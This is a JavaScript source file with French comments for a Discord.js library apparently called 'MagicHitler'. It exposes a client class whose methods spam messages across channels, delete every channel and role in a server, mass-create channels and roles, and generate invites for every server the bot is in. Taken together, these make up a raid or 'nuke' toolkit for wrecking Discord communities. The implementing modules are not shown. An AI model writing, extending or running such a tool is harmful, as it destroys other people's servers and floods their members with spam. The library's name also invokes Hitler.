/**
 * @constructor
 * @param {Object} parametres - Paramètres du client MagicHitler
 * @param {Client} parametres.client - Votre client Discord.js
 * @param {String} parametres.prefix - Optionnel ; préfixe pour vos commandes
 */
class Client {
    constructor(parametres = {}) {
        /**
         * @type {Client} - Votre client Discord.js
         */
        global.client = parametres.client;
        /**
         * @type {String} - Optionnel ; préfixe pour vos commandes
         */
        global.prefix = parametres.prefix || '';
    }


    // ------------------------------------------------------------------------------------ Messages


    /**
     * Envoyer un message dans un salon spécifique
     * @constructor
     * @param {String} message - Message à envoyer
     * @param {String} commande - Message à envoyer pour que le bot envoie le sien
     */
    sendMessage(message, commande) {
        require('./messages/sendMessage')(client, prefix, message, commande)
    }

    /**
     * Spammer un message dans un ou plusieurs salons
     * @constructor
     * @param {String} message - Message à spammer
     * @param {String} commande - Message à envoyer pour que le bot envoie les siens
     * @param {Object} parametres - Paramètres du spam
     * @param {Number} parametres.messageNumber - Optionnel ; Nombre de messages à envoyer
     * @param {Boolean} parametres.allChannels - Optionnel ; Spammer dans un seul ou plusieurs salons
     */
    spamMessages(message, commande, parametres) {
        require("./messages/spamMessage")(client, prefix, message, commande, parametres.messageNumber || 0, parametres.allChannels);
    }


    // ------------------------------------------------------------------------------------- Events


    /**
     * Affiche quelques informations sur le bot dans la console
     */
    ready() {
        require('./events/ready')(client);
    }


    // ------------------------------------------------------------------------------------ Channels


    /**
     * Supprime le salon dans lequel la commande est envoyée
     * @constructor
     * @param {String} commande
     */
    deleteChannel(commande) {
        require('./channels/deleteChannel')(client, prefix, commande);
    }

    /**
     * Supprime tous les salons d'un serveur
     * @constructor
     * @param {String} commande - Message à envoyer pour que le bot supprime tous les salons
     * @param {Object} parametres - Paramètres de la suppression
     * @param {Boolean} parametres.createChannel - Optionnel ; Créer un salon
     * @param {String} parametres.createdChannelName - Optionnel ; Nom du salon à créer ; random = nombre au hasard
     * @param {String} parametres.createChannelMessage - Optionnel ; Message à envoyer dans le salon créé
     * @param {Number} parametres.deleteSpecificChannels - Optionnel ; Supprimer un nombre spécifique de salons seulement
     */
    deleteChannels(commande, parametres) {
        require('./channels/deleteChannels')(client, prefix, commande, parametres)
    }

    /**
     * Créer des salons dans un serveur
     * @constructor
     * @param {String} commande - Message à envoyer pour que le bot crée les salons
     * @param {Object} parametres - Paramètres de la création
     * @param {String} parametres.createChannelName - Nom des salons
     * @param {String} parametres.sendMessageContent - Message à envoyer
     * @param {Number} parametres.sendMessageCount - Nombre de messages à envoyer
     * @param {Number}  parametres.createChannelCount - Nombre de salons à créer
     */
    createChannels(commande, parametres) {
        require('./channels/createChannels')(client, prefix, commande, parametres)
    }

    /**
     * Créer une invitation pour un serveur
     * @param {String} commande - Message à envoyer pour créer l'invitation
     * @param {Boolean} allGuilds - Optionnel ; Créer une invitation pour chaque serveur
     */
    createInvite(commande, allGuilds) {
        require('./channels/createInvite')(client, prefix, commande, allGuilds)
    }


    // ------------------------------------------------------------------------------------ Roles


    /**
     * Supprime tous les rôles d'un serveur
     * @param {String} commande - Message à envoyer pour supprimer les rôles
     */
    deleteRoles(commande) {
        require('./roles/deleteRoles')(client, prefix, commande)
    }
    
    /**
     * Crée des rôles sur un serveur
     * @param {String} commande - Message à envoyer pour créer les rôles
     * @param {Object} parametres - Paramètres de la créàtion
     * @param {String} parametres.rolesName - Nom des rôles à créer
     * @param {Number} parametres.rolesNumber - Nombre de rôles à créer
     */
    createRoles(commande, parametres) {
        require('./roles/createRoles')(client, prefix, commande, parametres)
    }
}

module.exports = Client;